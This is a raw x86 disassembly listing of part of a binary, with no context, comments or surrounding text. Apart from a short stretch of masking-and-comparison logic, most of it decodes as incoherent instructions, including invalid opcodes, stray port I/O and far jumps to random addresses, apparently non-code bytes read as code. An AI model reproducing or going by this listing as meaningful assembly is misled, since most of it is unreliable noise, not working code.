  41dfc9:	mov    WORD PTR [ebx+0x1f3031a8],gs
  41dfcf:	and    al,0x17
  41dfd1:	stos   DWORD PTR es:[edi],eax
  41dfd2:	push   0xffffffa7
  41dfd4:	test   BYTE PTR [ebp+0x72],ah
  41dfd7:	xchg   ebx,eax
  41dfd8:	mov    eax,0xb6b232ed
  41dfdd:	call   0x75c4d49f
  41dfe2:	repnz or ch,bl
  41dfe5:	(bad)  
  41dfe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfe7:	sub    al,0x39
  41dfe9:	loopne 0x41dffa
  41dfeb:	jnp    0x41dfc7
  41dfed:	data16 mov WORD PTR [eax+eiz*8+0x6256630c],fs
  41dff5:	xchg   DWORD PTR [esi],edx
  41dff7:	jle    0x41e070
  41dff9:	jmp    0x282b:0x76d6453f
  41e000:	adc    dl,BYTE PTR ds:0x7a2dbc73
  41e006:	aad    0xcf
  41e008:	and    edx,DWORD PTR [esi+0x4b]
  41e00b:	je     0x41e073
  41e00d:	js     0x41e083
  41e00f:	loopne 0x41dfff
  41e011:	cld    
  41e012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e013:	add    ah,cl
  41e015:	arpl   WORD PTR gs:[esi-0x37],sp
  41e019:	mov    al,ds:0x647d7c02
  41e01e:	xchg   edx,eax
  41e01f:	mov    dh,0x89
  41e021:	lods   al,BYTE PTR ds:[esi]
  41e022:	add    eax,0xae7638fc
  41e027:	fst    DWORD PTR [edi+ecx*2]
  41e02a:	test   al,0x1e
  41e02c:	in     al,dx
  41e02d:	or     DWORD PTR [ecx],0xa0486bf6
  41e033:	pop    edi
  41e034:	iret   
  41e035:	pop    eax
  41e036:	aad    0x28
  41e038:	add    ah,BYTE PTR [ebx]
  41e03a:	xor    al,0xd3
  41e03c:	xchg   edx,eax
  41e03d:	sub    BYTE PTR [ecx+0x1bc3f86],0xf8
  41e044:	xchg   ebx,eax
  41e045:	and    al,0xac
  41e047:	mov    dl,0xcf
  41e049:	inc    ebp
  41e04a:	lods   al,BYTE PTR ds:[esi]
  41e04b:	cdq    
  41e04c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e04d:	xor    al,0x1e
  41e04f:	(bad)  
  41e050:	call   0x1d7f5c65
  41e055:	aad    0x91
  41e057:	cmp    al,0xe6
  41e059:	leave  
  41e05a:	fisubr DWORD PTR [esi+ebp*8-0x60]
  41e05e:	sub    eax,0xf5ec8cb6
  41e063:	xchg   edx,eax
  41e064:	repnz sbb dl,BYTE PTR [edi+0x632d9c69]
  41e06b:	mov    BYTE PTR [ebx-0x74],bl
  41e06e:	dec    ebp
  41e06f:	sbb    al,0xbe
  41e071:	pop    ebx
  41e072:	push   0x10
  41e074:	dec    edi
  41e075:	call   0x593ccf0f
  41e07a:	leave  
  41e07b:	ret    0x6061
  41e07e:	mov    cl,0x3c
  41e080:	std    
  41e081:	add    edi,DWORD PTR [edx+edi*8-0x4d]
  41e085:	inc    eax
  41e086:	cmp    ecx,ebx
  41e088:	mov    ah,0x7b
  41e08a:	int3   
  41e08b:	push   eax
  41e08c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e08d:	push   ds
  41e08e:	cmp    DWORD PTR [ebp-0x5fe67264],ecx
  41e094:	data16 int 0xb6
  41e097:	mov    al,ds:0xe7143ec4
  41e09c:	pusha  
  41e09d:	mov    edi,0x5ecce44e
  41e0a2:	sub    DWORD PTR [ebx],esp
  41e0a4:	stos   BYTE PTR es:[edi],al
  41e0a5:	add    edi,DWORD PTR [ebx]
  41e0a7:	rcl    BYTE PTR [ebp-0x26],cl
  41e0aa:	pop    ebp
  41e0ab:	cmp    DWORD PTR [eax],edx
  41e0ad:	call   0xe51f:0x591e23e4
  41e0b4:	pop    esi
  41e0b5:	sbb    BYTE PTR [ebx],cl
  41e0b7:	and    cl,BYTE PTR [ebx+0x1ee212fc]
  41e0bd:	mov    edx,0x58a3678c
  41e0c2:	adc    eax,0x55a64007
  41e0c7:	idiv   BYTE PTR [esi-0x6f6bc2d5]
  41e0cd:	cdq    
  41e0ce:	es pop edx
  41e0d0:	fbld   TBYTE PTR [eax-0x2482c014]
  41e0d6:	scas   eax,DWORD PTR es:[edi]
  41e0d7:	cmp    eax,edi
  41e0d9:	lea    ebp,[ebp-0xe]
  41e0dc:	clc    
  41e0dd:	jmp    0xf820:0xe4de0936
  41e0e4:	push   ds
  41e0e5:	cdq    
  41e0e6:	cmp    DWORD PTR [edi-0x59],esi
  41e0e9:	ins    BYTE PTR es:[edi],dx
  41e0ea:	inc    esi
  41e0eb:	inc    edi
  41e0ec:	or     eax,0x6afafd03
  41e0f1:	push   es
  41e0f2:	pop    ebx
  41e0f3:	inc    eax
  41e0f4:	inc    esi
  41e0f5:	(bad)  
  41e0f7:	mov    eax,eax
  41e0f9:	ror    BYTE PTR [eax+0x7f],1
  41e0fc:	push   esi
  41e0fd:	push   ds
  41e0fe:	xor    edx,0x28090bb6
  41e104:	inc    ebp
  41e105:	inc    esp
  41e106:	aaa    
  41e107:	nop
  41e108:	inc    esp
  41e109:	gs push edx
  41e10b:	aas    
  41e10c:	dec    ecx
  41e10d:	inc    ecx
  41e10e:	int3   
  41e10f:	fdivr  QWORD PTR [ebp-0x13657a09]
  41e115:	hlt    
  41e116:	ds mov dl,0xc7
  41e119:	inc    esp
  41e11a:	and    al,0x10
  41e11c:	sbb    al,BYTE PTR [edx+0x0]
  41e11f:	add    BYTE PTR [ebx+0x25102444],cl
  41e125:	inc    esp
  41e126:	ret    0xffff
  41e129:	add    eax,DWORD PTR [esp+0x30]
  41e12d:	and    eax,0xfffffe5a
  41e132:	sub    eax,0x2ae1
  41e137:	and    eax,0x6f90
  41e13c:	mov    DWORD PTR [esp+0x30],eax
  41e140:	mov    DWORD PTR [esp+0x10],0x1515
  41e148:	mov    eax,DWORD PTR [esp+0x10]
  41e14c:	mov    ecx,DWORD PTR [esp+0x30]
  41e150:	or     eax,0x7113
  41e155:	add    eax,0x3d6a
  41e15a:	cmp    ecx,eax
  41e15c:	je     0x41e9ea
  41e162:	mov    eax,DWORD PTR [esp+0x40]
  41e166:	mov    edx,DWORD PTR [esp+0x18]
  41e16a:	mov    edi,DWORD PTR [esp+0x1c]
  41e16e:	xor    ecx,ecx
  41e170:	shld   ecx,eax,0x2
  41e174:	shl    eax,0x2
  41e177:	xor    eax,ebx
  41e179:	xor    ecx,esi
  41e17b:	cmp    eax,edx
  41e17d:	jne    0x41e18b
  41e183:	cmp    ecx,edi
  41e185:	je     0x41e9a3
  41e18b:	mov    eax,DWORD PTR [esp+0x44]
  41e18f:	mov    eax,DWORD PTR [esp+0x44]
  41e193:	mov    eax,DWORD PTR [esp+0x44]
  41e197:	mov    ecx,DWORD PTR [esp+0x44]
  41e19b:	xor    eax,0xa4069aaf
  41e1a0:	xor    ecx,0xfffffffe
  41e1a3:	shr    eax,0x2
  41e1a6:	shl    ecx,0x1e
  41e1a9:	or     eax,ecx
  41e1ab:	xor    ecx,ecx
  41e1ad:	shld   ecx,eax,0x2
  41e1b1:	shl    eax,0x2
  41e1b4:	xor    eax,ebx
  41e1b6:	xor    ecx,esi
  41e1b8:	cmp    eax,0xca79a571
  41e1bd:	jne    0x41e1cb
  41e1c3:	cmp    ecx,esi
  41e1c5:	je     0x41e9ea
  41e1cb:	mov    eax,DWORD PTR [esp+0x60]
  41e1cf:	cdq    
  41e1d0:	mov    eax,DWORD PTR [esp+0x60]
  41e1d4:	mov    ecx,edx
  41e1d6:	cdq    
  41e1d7:	shld   edx,eax,0x2
  41e1db:	shr    ecx,0x1e
  41e1de:	xor    edi,edi
  41e1e0:	jmp    0x41e5af
  41e1e5:	inc    esp
  41e1e6:	mov    eax,ds:0x1a1c22c9
  41e1eb:	and    bl,BYTE PTR [edi+0x7e4d5dcf]
  41e1f1:	retf   
  41e1f2:	imul   ecx,ecx,0x163fc67c
  41e1f8:	sbb    BYTE PTR [edx+edx*1+0x1cb71818],bh
  41e1ff:	retf   0x73e0
  41e202:	lea    esp,[edx+0x5dce9a57]
  41e208:	or     ch,BYTE PTR [edx]
  41e20a:	push   ebp
  41e20b:	stos   DWORD PTR es:[edi],eax
  41e20c:	(bad)  
  41e20d:	jne    0x41e1a8
  41e20f:	call   0x5946:0x7c839f09
  41e216:	int3   
  41e217:	jo     0x41e239
  41e219:	ret    0xd659
  41e21c:	jmp    0x41e1aa
  41e21e:	(bad)  
  41e21f:	mov    BYTE PTR [edi+0x37f85c84],dh
  41e225:	fwait
  41e226:	xor    esi,0x48
  41e229:	nop
  41e22a:	clc    
  41e22b:	push   esi
  41e22c:	and    dh,BYTE PTR [edi+0x3c14211a]
  41e232:	dec    ecx
  41e233:	mov    dh,0x94
  41e235:	adc    DWORD PTR [ebx+0x5355f23b],edx
  41e23b:	xchg   ecx,eax
  41e23c:	repz into 
  41e23e:	nop
  41e23f:	xchg   esp,eax
  41e240:	je     0x41e2bc
  41e242:	rcr    DWORD PTR [edx+0x7b],0xdf
  41e246:	inc    ebx
  41e247:	xchg   ebp,eax
  41e248:	mov    bl,0xb9
  41e24a:	jnp    0x41e1fe
  41e24c:	idiv   ch
  41e24e:	dec    ebp
  41e24f:	push   ebx
  41e250:	into   
  41e251:	fisub  WORD PTR [ebp+0x4b]
  41e254:	cmp    eax,0xda8bb53a
  41e259:	mov    eax,ds:0x9873ad67
  41e25e:	aaa    
  41e25f:	scas   al,BYTE PTR es:[edi]
  41e260:	pop    ebx
  41e261:	xlat   BYTE PTR ds:[ebx]
  41e262:	mov    edi,eax
  41e264:	jecxz  0x41e299
  41e266:	pusha  
  41e267:	ret    0x7fe0
  41e26a:	fs adc al,0xf8
  41e26d:	push   es
  41e26e:	sub    BYTE PTR [edi-0x6ca17bba],dl
  41e274:	mov    ds:0x8d225c74,eax
  41e279:	xchg   DWORD PTR [edi-0x39f325bf],ebp
  41e27f:	das    
  41e280:	cmp    DWORD PTR [ebp+0x12b6ef82],ecx
  41e286:	or     eax,0x29e6c76
  41e28b:	ret    0x7b9d
  41e28e:	adc    al,0x3c
  41e290:	add    BYTE PTR [edx-0x33],bl
  41e293:	loop   0x41e25e
  41e295:	rcr    BYTE PTR [ebp+0x18],0x41
  41e299:	out    dx,al
  41e29a:	aas    
  41e29b:	pushf  
  41e29c:	add    DWORD PTR [edx+ecx*4],0xffffffb7
  41e2a0:	cmp    BYTE PTR [ecx-0x1c],ah
  41e2a3:	popa   
  41e2a4:	mov    ebx,0xa4148de9
  41e2a9:	mov    ebp,0xa3eb9b9a
  41e2ae:	and    BYTE PTR [edx-0x35],0xdf
  41e2b2:	jb     0x41e322
  41e2b4:	mov    esp,0x62509cf7
  41e2b9:	xor    cl,BYTE PTR [ebx-0x495c2b1b]
  41e2bf:	outs   dx,BYTE PTR ds:[esi]
  41e2c0:	cmp    ecx,edi
  41e2c2:	and    eax,0xba313765
  41e2c7:	or     BYTE PTR [eax+0x1e],0x44
  41e2cb:	dec    edx
  41e2cc:	je     0x41e2de
  41e2ce:	sahf   
  41e2cf:	mov    edx,DWORD PTR [edx+0x6f]
  41e2d2:	sbb    DWORD PTR [ebx+0x49],0xffffffde
  41e2d6:	fucomp st(3)
  41e2d8:	(bad)  
  41e2d9:	jne    0x41e2ee
  41e2db:	clc    
  41e2dc:	mov    eax,ss
  41e2de:	scas   eax,DWORD PTR es:[edi]
  41e2df:	jno    0x41e30f
  41e2e1:	pop    es
  41e2e2:	leave  
  41e2e3:	bound  esp,QWORD PTR [ebx+0x75]
  41e2e6:	rcl    BYTE PTR [eax-0x569fa730],1
  41e2ec:	js     0x41e318
  41e2ee:	xchg   edi,eax
  41e2ef:	mov    ds:0xf05fbbac,al
  41e2f4:	into   
  41e2f5:	arpl   sp,cx
  41e2f7:	aad    0xd7
  41e2f9:	in     eax,0x91
  41e2fb:	fsub   DWORD PTR [esi-0x5b7e3f85]
  41e301:	xor    al,0xfe
  41e303:	repz int 0xaa
  41e306:	inc    ebp
  41e307:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e309:	jae    0x41e337
  41e30b:	xor    eax,0x4aa19e44
  41e310:	xor    ebp,DWORD PTR [esi+0xd]
  41e313:	push   esp
  41e314:	sti    
  41e315:	adc    esi,0xdc94590
  41e31b:	pop    ebp
  41e31c:	aas    
  41e31d:	or     BYTE PTR [esi+0x7c],dh
  41e320:	jecxz  0x41e390
  41e322:	adc    BYTE PTR [ebx+0x11],ah
  41e325:	adc    cl,bl
  41e327:	sbb    eax,0x85ee4264
  41e32c:	dec    eax
  41e32d:	rcl    DWORD PTR [ecx],1
  41e32f:	es int 0xc8
  41e332:	stos   BYTE PTR es:[edi],al
  41e333:	sub    dl,BYTE PTR [ebp*1-0x4008abb6]
  41e33a:	lds    ebx,FWORD PTR [bx]
  41e33d:	adc    dh,dl
  41e33f:	imul   edx,esi,0x2c600966
  41e345:	das    
  41e346:	cmp    BYTE PTR [edi],0xb9
  41e349:	(bad)  [eax]
  41e34b:	jge    0x41e3ba
  41e34d:	sti    
  41e34e:	xlat   BYTE PTR ds:[ebx]
  41e34f:	mov    al,0x37
  41e351:	xor    BYTE PTR [ecx-0x6f],dh
  41e354:	div    DWORD PTR [edi-0x25b7154e]
  41e35a:	or     BYTE PTR [esp+esi*8],dl
  41e35d:	aaa    
  41e35e:	inc    ecx
  41e35f:	adc    BYTE PTR [esi],bl
  41e361:	mov    dl,0x14
  41e363:	push   ss
  41e364:	cmp    BYTE PTR [esi-0x3fca9886],al
  41e36a:	pop    ds
  41e36b:	mov    edx,0xf9ccfaa1
  41e370:	aad    0xc2
  41e372:	xchg   ebx,eax
  41e373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e374:	rol    BYTE PTR [eax+0x1cebe39],0x74
  41e37b:	jno    0x41e3cb
  41e37d:	cmp    BYTE PTR ds:0x68d0dc06,ch
  41e383:	pop    ss
  41e384:	cs mov cl,0x2e
  41e387:	inc    edi
  41e388:	and    ecx,DWORD PTR [esi-0x8]
  41e38b:	jp     0x41e353
  41e38d:	inc    esp
  41e38e:	repz xor DWORD PTR [edx+0x67],0x3c
  41e393:	mov    eax,ds:0x911ba4f7
  41e398:	mov    ds:0xf74df04f,al
  41e39d:	and    dh,0x38
  41e3a0:	call   0xfa34:0x8aa564b7
  41e3a7:	inc    ebx
  41e3a8:	fwait
  41e3a9:	sub    ecx,DWORD PTR [ebp-0x38fbb502]
  41e3af:	je     0x41e3f2
  41e3b1:	into   
  41e3b2:	xor    eax,0x91b09c8e
  41e3b7:	jne    0x41e369
  41e3b9:	push   esp
  41e3ba:	push   es
  41e3bb:	in     eax,dx
  41e3bc:	adc    ah,BYTE PTR [ebx-0x1302300d]
  41e3c2:	and    bl,BYTE PTR [ebx]
  41e3c4:	ss jl  0x41e42c
  41e3c7:	cld    
  41e3c8:	inc    esi
  41e3c9:	fst    QWORD PTR [edi]
  41e3cb:	mov    bl,0xf2
  41e3cd:	test   eax,0xdc94b7d9
  41e3d2:	cmp    DWORD PTR [edi-0x1d],0x43f11d40
  41e3d9:	mov    ebx,0x39434b8f
  41e3de:	sbb    eax,0xfcb1147b
  41e3e3:	(bad)  
  41e3e4:	std    
  41e3e5:	xor    ebx,DWORD PTR [ebx]
  41e3e7:	dec    esp
  41e3e8:	dec    ecx
  41e3e9:	cmp    DWORD PTR [edx],0x41
  41e3ec:	adc    ebp,DWORD PTR [edi]
  41e3ee:	fnsave [esi+0x6b6487ae]
  41e3f4:	or     ecx,esp
  41e3f6:	(bad)  
  41e3f7:	sbb    dl,bh
  41e3f9:	inc    esi
  41e3fa:	mov    BYTE PTR ds:0xa42bf34c,dl
  41e400:	ins    DWORD PTR es:[edi],dx
  41e401:	xor    BYTE PTR [esi-0x1f],cl
  41e404:	mov    esp,0x6b8eaf09
  41e409:	inc    edi
  41e40a:	jge    0x41e452
  41e40c:	inc    esi
  41e40d:	push   ds
  41e40e:	(bad)  
  41e410:	jb     0x41e3fa
  41e412:	arpl   di,ax
  41e414:	cmp    ch,BYTE PTR [ecx-0x5b7f3eb]
  41e41a:	in     al,0x13
  41e41c:	rcr    DWORD PTR [ebx-0x14],0x6c
  41e420:	mov    ecx,0xff9d5cf3
  41e425:	xchg   edx,eax
  41e426:	xchg   ecx,eax
  41e427:	xchg   esp,eax
  41e428:	(bad)  [ebp-0x32ec22b9]
  41e42e:	sbb    DWORD PTR [ebp-0x71045241],edx
  41e434:	mov    dh,BYTE PTR [ecx-0x3f]
  41e437:	aaa    
  41e438:	js     0x41e422
  41e43a:	jmp    0xca62206f
  41e43f:	fs mov cl,0xdf
  41e442:	mov    edi,0x6debe47d
  41e447:	(bad)  
  41e448:	sub    ebx,DWORD PTR [eax-0x744d5af8]
  41e44e:	inc    esi
  41e44f:	xor    DWORD PTR [ebx],0xe55607c3
  41e455:	pop    ss
  41e456:	push   ecx
  41e457:	sti    
  41e458:	pop    ebx
  41e459:	(bad)  
  41e45a:	push   0x98c9ad76
  41e45f:	mov    ch,0x75
  41e461:	push   edi
  41e462:	pop    edx
  41e464:	dec    esp
  41e465:	or     ebx,DWORD PTR [ecx+0x2c935a4d]
  41e46b:	mov    ds:0xf02843ff,al
  41e470:	jns    0x41e4db
  41e472:	jmp    0x41e489
  41e474:	mov    gs,esi
  41e476:	add    bl,al
  41e478:	push   ebx
  41e479:	je     0x41e4e1
  41e47b:	adc    dl,bh
  41e47d:	ja     0x41e4a3
  41e47f:	retf   
  41e480:	add    al,0x48
  41e482:	push   eax
  41e483:	mov    eax,0x15af531c
  41e488:	push   ecx
  41e489:	mov    al,0x47
  41e48b:	xchg   esi,eax
  41e48c:	pop    edi
  41e48d:	out    dx,al
  41e48e:	push   esp
  41e48f:	repz xchg esp,eax
  41e491:	in     eax,0x41
  41e493:	push   ebx
  41e494:	inc    edx
  41e495:	or     eax,0x5c5913f8
  41e49a:	inc    eax
  41e49b:	adc    dh,BYTE PTR [esp+eiz*8+0x70]
  41e49f:	shr    DWORD PTR [edx+0x68],cl
  41e4a2:	push   ebp
  41e4a3:	jno    0x41e471
  41e4a5:	imul   edi,ebp,0xdb028a29
  41e4ab:	push   ds
  41e4ac:	add    dh,BYTE PTR [edx-0x80]
  41e4af:	das    
  41e4b0:	push   eax
  41e4b1:	(bad)  
  41e4b2:	sbb    ch,dh
  41e4b4:	or     ebx,DWORD PTR [ebx+0x23591fa2]
  41e4ba:	adc    DWORD PTR ds:0x634e98ce,edi
  41e4c0:	add    al,0x9a
  41e4c2:	and    BYTE PTR [eax-0x16],dh
  41e4c5:	mov    bl,0x15
  41e4c7:	jle    0x41e4e5
  41e4c9:	xchg   ecx,eax
  41e4ca:	pop    ebx
  41e4cb:	adc    DWORD PTR [ebx-0x47c69f1],ebx
  41e4d1:	mov    esp,0xaa416fad
  41e4d6:	nop
  41e4d7:	jmp    0x726014b7
  41e4dc:	pop    edx
  41e4dd:	ins    DWORD PTR es:[edi],dx
  41e4de:	cmc    
  41e4df:	(bad)  
  41e4e1:	adc    al,BYTE PTR [esi+edx*8+0x1e7a3db]
  41e4e8:	shr    BYTE PTR [edi-0x6d],1
  41e4eb:	jmp    0x41e51e
  41e4ed:	xor    eax,0x2ec9d4e1
  41e4f2:	dec    edx
  41e4f3:	nop
  41e4f4:	xlat   BYTE PTR ds:[ebx]
  41e4f5:	sbb    eax,0xa7ac494a
  41e4fa:	xor    ah,BYTE PTR [eax-0x55e4553e]
  41e500:	pusha  
  41e501:	repz push ecx
  41e503:	adc    edx,DWORD PTR [eax]
  41e505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e506:	or     eax,0x7224cb7c
  41e50b:	jb     0x41e497
  41e50d:	jns    0x41e49d
  41e50f:	adc    DWORD PTR [ebp-0xd554204],ebp
  41e515:	fs out dx,eax
  41e517:	out    dx,al
  41e518:	ss scas eax,DWORD PTR es:[di]
  41e51b:	js     0x41e58f
  41e51d:	mov    ds:0xf165c250,al
  41e522:	cmp    eax,DWORD PTR [esi-0x3e]
  41e525:	sahf   
  41e526:	mov    cl,BYTE PTR [edx]
  41e528:	es cmp al,0xa2
  41e52b:	aaa    
  41e52c:	jp     0x41e4d2
  41e52e:	jb     0x41e4c3
  41e530:	dec    edx
  41e531:	or     eax,0xd2e4d6
  41e536:	mov    DWORD PTR [edi-0xa4a9dd7],0x50750198
  41e540:	xchg   edi,eax
  41e541:	dec    ebp
  41e543:	aaa    
  41e544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e545:	dec    ecx
  41e546:	call   0x5a6fba36
  41e54b:	pop    edi
  41e54c:	mov    ds:0xaca6e318,eax
  41e551:	into   
  41e552:	idiv   eax
  41e554:	sub    eax,0x150a750c
  41e559:	or     BYTE PTR [edx+0x40],0x71
  41e55d:	push   cs
  41e55e:	dec    ebx
  41e55f:	int    0x46
  41e561:	sbb    edi,DWORD PTR [eax]
  41e563:	adc    eax,0x42924c62
  41e568:	xor    dh,dh
  41e56a:	addr16 pop edi
  41e56c:	or     cl,0xd
  41e56f:	xlat   BYTE PTR ds:[ebx]
  41e570:	pop    edi
  41e571:	pop    ss
  41e572:	or     BYTE PTR [edi+0x32],0xa5
  41e576:	and    DWORD PTR [edx-0x3e82214e],ebp
  41e57c:	jl     0x41e573
  41e57e:	fistp  WORD PTR [edx+0x3896de05]
  41e584:	stos   BYTE PTR es:[edi],al
  41e585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e586:	test   eax,0xc89c5136
  41e58b:	ret    
  41e58c:	fwait
  41e58d:	mov    WORD PTR [edx-0x76],gs
  41e590:	xchg   DWORD PTR [eax+eiz*1+0x7a342f78],edx
  41e597:	jg     0x41e589
  41e599:	jno    0x41e587
  41e59b:	aaa    
  41e59c:	iret   
  41e59d:	inc    ebx
  41e59e:	popa   
  41e59f:	out    0x27,eax
  41e5a1:	sbb    dh,dh
  41e5a3:	cli    
  41e5a4:	imul   BYTE PTR [ebp-0x21]
  41e5a7:	retf   
  41e5a8:	pop    edx
  41e5a9:	cdq    
  41e5aa:	jns    0x41e600
  41e5ac:	out    0x4a,al
  41e5ae:	mov    edi,0xb02e0c1
  41e5b3:	shr    ecx,0xca
  41e5b6:	add    eax,DWORD PTR [eax]
  41e5b8:	add    BYTE PTR [esi+ecx*1+0x1e7a9f90],al
  41e5bf:	and    ch,BYTE PTR [edx]
  41e5c1:	xor    eax,0xeeaae715
  41e5c6:	nop
  41e5c7:	push   edi
  41e5c8:	stos   BYTE PTR es:[edi],al
  41e5c9:	imul   esi,DWORD PTR [edi],0x16
  41e5cc:	sbb    BYTE PTR [edx+edx*1-0x2d7e7e8],bh
  41e5d3:	pop    ss
  41e5d4:	daa    
  41e5d5:	test   al,0xbb
  41e5d7:	jne    0x41e56e
  41e5d9:	cmc    
  41e5da:	pop    edi
  41e5db:	add    al,0x7b
  41e5dd:	fbstp  TBYTE PTR [edx+0x4]
  41e5e0:	cmp    eax,0x6315d3e6
  41e5e5:	push   0x8e95dcee
  41e5ea:	es nop
  41e5ec:	push   edi
  41e5ed:	aas    
  41e5ee:	dec    edi
  41e5ef:	aad    0xc9
  41e5f1:	dec    eax
  41e5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5f3:	retf   
  41e5f4:	fist   WORD PTR [esi-0x6f908156]
  41e5fa:	test   bl,bh
  41e5fc:	or     al,0x4a
  41e5fe:	je     0x41e61f
  41e600:	sbb    eax,0x349a0877
  41e605:	aam    0x13
  41e607:	stos   DWORD PTR es:[edi],eax
  41e608:	pop    ebx
  41e609:	push   ecx
  41e60a:	fs gs int3 
  41e60d:	mov    esp,0x14631891
  41e612:	cmp    DWORD PTR [eax],ebx
  41e614:	nop
  41e615:	aaa    
  41e616:	and    eax,0x13143140
  41e61b:	mov    eax,0x27e78345
  41e620:	or     cl,0xcb
  41e623:	(bad)  
  41e624:	mov    ebp,DWORD PTR [edi+0x42]
  41e627:	rcr    edi,cl
  41e629:	sti    
  41e62a:	int    0xb9
  41e62c:	adc    bh,BYTE PTR [ebx]
  41e62e:	sub    DWORD PTR [eax+0x48],ebx
  41e631:	xor    al,0x90
  41e633:	pop    edx
  41e634:	push   ss
  41e635:	or     al,0xd8
  41e637:	dec    esi
  41e638:	mov    dl,0x81
  41e63a:	mov    bl,0xa9
  41e63c:	std    
  41e63d:	in     eax,dx
  41e63e:	inc    ebp
  41e63f:	pop    ss
  41e640:	outs   dx,DWORD PTR ds:[esi]
  41e641:	mov    edx,0x93da5ef6
  41e646:	mov    bh,0xeb
  41e648:	mov    ebx,0xb95041a8
  41e64d:	inc    edx
  41e64e:	jb     0x41e675
  41e650:	sbb    eax,0x30d480f0
  41e655:	sbb    eax,0x9890ef64
  41e65a:	cmp    ch,al
  41e65c:	lods   eax,DWORD PTR ds:[esi]
  41e65d:	sub    BYTE PTR cs:[ebx+0x71],ah
  41e661:	or     BYTE PTR [eax+0x25d00a0d],cl
  41e667:	dec    ebx
  41e668:	sub    DWORD PTR [edi-0x5149ace5],ebx
  41e66e:	int    0x48
  41e670:	call   0x8151:0x8acee2bf
  41e677:	mov    ch,0xf0
  41e679:	test   ch,0xcd
  41e67c:	shr    DWORD PTR [ecx+0x6c807001],0x6b
  41e683:	pop    eax
  41e684:	pop    edx
  41e685:	fs pop eax
  41e687:	ficomp DWORD PTR [eax+0x7c]
  41e68a:	adc    eax,0xc74f79e1
  41e68f:	sahf   
  41e690:	jmp    0x41e6b9
  41e692:	mov    edx,0x2b1e6e90
  41e697:	std    
  41e698:	int3   
  41e699:	shl    DWORD PTR [ecx-0x65903627],cl
  41e69f:	pextrw ebp,mm1,0x9
  41e6a3:	in     al,0x9b
  41e6a5:	repz push es
  41e6a7:	mov    ah,0xc5
  41e6a9:	mov    dh,0x1a
  41e6ab:	in     eax,0x4d
  41e6ad:	mov    BYTE PTR [eax+eax*2+0x5eb2dbf7],dh
  41e6b4:	sbb    al,0x12
  41e6b6:	pop    ss
  41e6b7:	lock xor bh,0x14
  41e6bb:	aam    0x5c
  41e6bd:	fs (bad) 
  41e6bf:	or     eax,0x144c0bd3
  41e6c4:	aas    
  41e6c5:	add    ebx,edi
  41e6c7:	jns    0x41e71a
  41e6c9:	int    0x4
  41e6cb:	adc    al,0x8b
  41e6cd:	shl    BYTE PTR [esi-0x3e],0x1e
  41e6d1:	loop   0x41e690
  41e6d3:	or     eax,0x7681be40
  41e6d8:	inc    BYTE PTR [eax]
  41e6da:	cld    
  41e6db:	cwde   
  41e6dc:	sbb    al,0x87
  41e6de:	add    BYTE PTR [ebp+0x4265f768],0x2b
  41e6e5:	sub    DWORD PTR [ebx+0x5a1d12b7],edx
  41e6eb:	add    BYTE PTR [edx+0x6e],bh
  41e6ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6ef:	pushf  
  41e6f0:	jmp    0x59ab:0x482bd28c
  41e6f7:	or     BYTE PTR [ebp-0x37832b69],dh
  41e6fd:	mov    esi,0x1bddd2b5
  41e702:	jmp    0xbbaa0d9f
  41e707:	in     al,dx
  41e708:	bound  edi,QWORD PTR [eax]
  41e70a:	hlt    
  41e70b:	pusha  
  41e70c:	xchg   esp,edi
  41e70e:	sar    BYTE PTR [ecx*8+0x5db40ff5],cl
  41e715:	test   eax,0xd8996865
  41e71a:	in     al,dx
  41e71b:	data16 sub dh,bh
  41e71e:	cmp    eax,DWORD PTR [edi+0x41]
  41e721:	(bad)  
  41e722:	and    ah,BYTE PTR [edx]
  41e724:	add    al,0xbb
  41e726:	xor    edi,DWORD PTR [edx]
  41e728:	(bad)  
  41e729:	outs   dx,BYTE PTR ds:[esi]
  41e72a:	ds es xor eax,0xebf5b225
  41e731:	xor    DWORD PTR [eax-0x72],ecx
  41e734:	add    ecx,DWORD PTR [edx+ecx*2]
  41e737:	mov    eax,0x291b472c
  41e73c:	or     ebx,0xffffff91
  41e73f:	cld    
  41e740:	push   ss
  41e741:	daa    
  41e742:	xchg   edi,eax
  41e743:	ins    DWORD PTR es:[edi],dx
  41e744:	arpl   WORD PTR [ebp+0xb41e3b4],bp
  41e74a:	fdivr  DWORD PTR [edx-0x4475228d]
  41e750:	fucom  st(6)
  41e752:	jo     0x41e6df
  41e754:	inc    esp
  41e755:	shl    BYTE PTR [edi-0x76],cl
  41e758:	(bad)  
  41e759:	aad    0x39
  41e75b:	jle    0x41e6f3
  41e75d:	pop    ss
  41e75e:	or     al,0x7b
  41e760:	add    ebp,edx
  41e762:	dec    ebp
  41e763:	das    
  41e764:	mul    BYTE PTR [esp+ecx*4+0x10]
  41e768:	jne    0x41e6ed
  41e76a:	jl     0x41e700
  41e76c:	add    eax,0xcfac6ad2
  41e772:	clc    
  41e773:	nop
  41e774:	out    dx,al
  41e775:	dec    edi
  41e776:	imul   edx,ebx,0x71
  41e779:	popf   
  41e77a:	xchg   ebp,eax
  41e77b:	add    dl,BYTE PTR [eax]
  41e77d:	jo     0x41e752
  41e77f:	imul   ecx,DWORD PTR [edi],0xfffffff5
  41e782:	mov    edi,0x400ab157
  41e787:	ds jmp 0x81af:0xfffb596
  41e78f:	(bad)  [esi]
  41e791:	sub    BYTE PTR [ebx+0x20],dl
  41e794:	pusha  
  41e795:	and    dl,BYTE PTR [edi-0x79f8c890]
  41e79b:	in     eax,0x60
  41e79d:	(bad)  
  41e79e:	fild   DWORD PTR [esi-0x38dfc830]
  41e7a4:	jae    0x41e76e
  41e7a6:	clc    
  41e7a7:	cmp    BYTE PTR [esi+0x4eb4d7b6],0xf1
  41e7ae:	aam    0xc
  41e7b0:	xchg   edi,eax
  41e7b1:	mov    ah,0x44
  41e7b3:	ss cwde 
  41e7b5:	mov    esp,DWORD PTR [edi]
